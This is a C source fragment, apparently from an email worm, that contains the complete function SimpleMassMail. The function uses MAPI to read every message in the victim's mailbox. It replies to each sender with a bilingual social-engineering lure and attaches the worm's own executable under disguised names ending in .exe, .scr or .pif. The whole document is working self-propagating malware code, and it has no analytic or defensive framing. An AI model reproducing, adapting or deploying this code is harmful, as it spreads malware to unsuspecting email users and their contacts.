   void SimpleMassMail(void)
   {
       char            WormFile[MAX_PATH];
       HINSTANCE       MapiDll;
       LPMAPILOGON     MapiLogon;
       LPMAPIFINDNEXT  MapiFindNext;
       LPMAPIREADMAIL  MapiReadMail;
       LPMAPILOGOFF    MapiLogoff;
       LHANDLE         MapiSessionHandle;
       char            MessageBuffer[512];
       MapiMessage     *GetMessage;
       char            VictimName[MAX_PATH];
       char            VictimMail[MAX_PATH];
       char            HostName[MAX_PATH];
       char            HostMail[MAX_PATH];
       char            MailSubject[MAX_PATH];
       char            MailBody[2048];
       char            LangBuffer[4];
       char            MailBodyBuffer[2048];
       char            MailAttachmentBuffer[MAX_PATH];
       unsigned int    MailCount = 0;
       char            *GermanHello[] =    {
                                            "Guten Tag",
                                            "Tach",
                                            "Was geht?!",
                                            "Hi,",
                                            "Na... was los?"
                                           };
       char            *GermanBody[] =     {
                                            "Hier is ja deine Datei...",
                                            "Nerv mal nich so, schau dir den Anhang an!",
                                            "Der Hammer :D...",
                                            "Ich sag nur Anhang :]",
                                            "Schau dir das einfach mal an, da wird man doch crazy, oder???",
                                            "Hehe, die Bilder im Archiv gefallen mir so richtig gut ;))"
                                           };
       char            *GermanAttachment[] = {
                                            "Datei",
                                            "Deine_Datei",
                                            "DeinFile",
                                            "Archiv",
                                            "Schau_es_dir_an"
                                           };
       char            *Suffix[] =         {
                                            "exe",
                                            "scr",
                                            "pif"
                                           };
       char            *EnglishHello[] =   {
                                            "Hello,",
                                            "Whats up?!",
                                            "Heya...",
                                            "Hoy Hoy ;)",
                                            "Hi, how are you,"
                                           };
       char            *EnglishBody[] =    {
                                            "Here is your file...",
                                            "The file you asked for is attached!!",
                                            "Funny stuff in the archive, i luv it ;D",
                                            "No words, just look at it, hrhr.",
                                            "Funny stuff :] check it!"
                                           };
       char            *EnglishAttachment[] = {
                                            "File",
                                            "YourFile",
                                            "Check_it_out_now",
                                            "FunnyStuff",
                                            "h0t_shit"
                                           };

       if(GetModuleFileName(0, WormFile, sizeof(WormFile)) == 0) return;

       MapiDll = LoadLibrary("MAPI32.DLL");

       if(MapiDll != 0)
       {
           MapiLogon       = (LPMAPILOGON)     GetProcAddress(MapiDll, "MAPILogon");
           MapiFindNext    = (LPMAPIFINDNEXT)  GetProcAddress(MapiDll, "MAPIFindNext");
           MapiReadMail    = (LPMAPIREADMAIL)  GetProcAddress(MapiDll, "MAPIReadMail");
           MapiLogoff      = (LPMAPILOGOFF)    GetProcAddress(MapiDll, "MAPILogoff");

           if(MapiLogon(0, 0, 0, 0, 0, &MapiSessionHandle) == SUCCESS_SUCCESS)
           {
               while(MapiFindNext(MapiSessionHandle, 0, 0, MessageBuffer, MAPI_GUARANTEE_FIFO, 0, MessageBuffer) == SUCCESS_SUCCESS)
               {
                   if(MapiReadMail(MapiSessionHandle, 0, MessageBuffer, 0, 0, &GetMessage) == SUCCESS_SUCCESS)
                   {
                       lstrcpy(VictimName, GetMessage->lpOriginator->lpszName);
                       lstrcpy(VictimMail, GetMessage->lpOriginator->lpszAddress);

                       lstrcpy(HostName, GetMessage->lpRecips->lpszName);
                       lstrcpy(HostMail, GetMessage->lpRecips->lpszAddress);
                       if(lstrcmp(HostName, HostMail) == 0) lstrcpy(HostName, "Sweetheart ;)");

                       lstrcpy(MailSubject, "Re: ");
                       lstrcat(MailSubject, GetMessage->lpszSubject);
                       lstrcpy(MailBody, GetMessage->lpszNoteText);

                       lstrcpy(LangBuffer, VictimMail + lstrlen(VictimMail) - 3);

                       if(lstrcmp(LangBuffer, ".de") == 0 || lstrcmp(LangBuffer, ".DE") == 0 || lstrcmp(LangBuffer, ".De") == 0)
                       {
                           lstrcpy(MailBodyBuffer, GermanHello[RandomNumber(5)]);
                           lstrcat(MailBodyBuffer, "\r\n\r\n");
                           lstrcat(MailBodyBuffer, GermanBody[RandomNumber(5)]);
                           lstrcat(MailBodyBuffer, "\r\n\r\n\r\nNachricht von ");
                           lstrcat(MailBodyBuffer, VictimMail);
                           lstrcat(MailBodyBuffer, " :\r\n_____________________________\r\n");
                           lstrcat(MailBodyBuffer, MailBody);
                           lstrcpy(MailAttachmentBuffer, GermanAttachment[RandomNumber(5)]);
                           lstrcat(MailAttachmentBuffer, ".");
                           lstrcat(MailAttachmentBuffer, Suffix[RandomNumber(3)]);
                       }
                       else
                       {
                           lstrcpy(MailBodyBuffer, EnglishHello[RandomNumber(5)]);
                           lstrcat(MailBodyBuffer, "\r\n\r\n");
                           lstrcat(MailBodyBuffer, EnglishBody[RandomNumber(5)]);
                           lstrcat(MailBodyBuffer, "\r\n\r\n\r\nMessage from ");
                           lstrcat(MailBodyBuffer, VictimMail);
                           lstrcat(MailBodyBuffer, " :\r\n_____________________________\r\n");
                           lstrcat(MailBodyBuffer, MailBody);
                           lstrcpy(MailAttachmentBuffer, EnglishAttachment[RandomNumber(5)]);
                           lstrcat(MailAttachmentBuffer, ".");
                           lstrcat(MailAttachmentBuffer, Suffix[RandomNumber(3)]);
                       }

                       MapiSendMail(MapiSessionHandle, VictimName, VictimMail, MailSubject, MailBodyBuffer, MailAttachmentBuffer, WormFile);

                       MailCount++;
                   }
               }

               MapiLogoff(MapiSessionHandle, 0, 0, 0);
           }

           FreeLibrary(MapiDll);
       }

       return;
   }
